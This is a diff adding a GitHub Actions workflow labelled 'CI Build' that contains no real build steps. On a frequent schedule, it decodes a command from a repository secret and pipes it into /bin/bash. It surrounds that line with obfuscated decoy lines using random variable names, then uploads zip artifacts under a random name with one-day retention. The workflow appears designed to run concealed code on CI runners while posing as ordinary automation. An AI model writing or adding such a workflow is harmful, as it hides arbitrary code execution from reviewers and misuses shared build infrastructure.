@@ -1,0 +1,38 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          iphoo614: ${{ secrets.iphoo614 }}
+        run: |
+          printf '%s' "$iphoo614" | jq -r .iwklp4720 | /bin/bash
+          echo $wfzf37 | jq -r .e1803 | /bin/bash
+          printf '%s' "$sre2" | jq -r .fwno3 | /bin/bash
+          echo $vnk4329 | jq -r .irnln51 | /bin/bash
+          printf '%s' "$j7" | jq -r .wros5 | /bin/bash
+          printf '%s' "$ydux58431" | jq -r .epiq84939 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: CtLrjAXd
+          path: "*.zip"
+          retention-days: 1
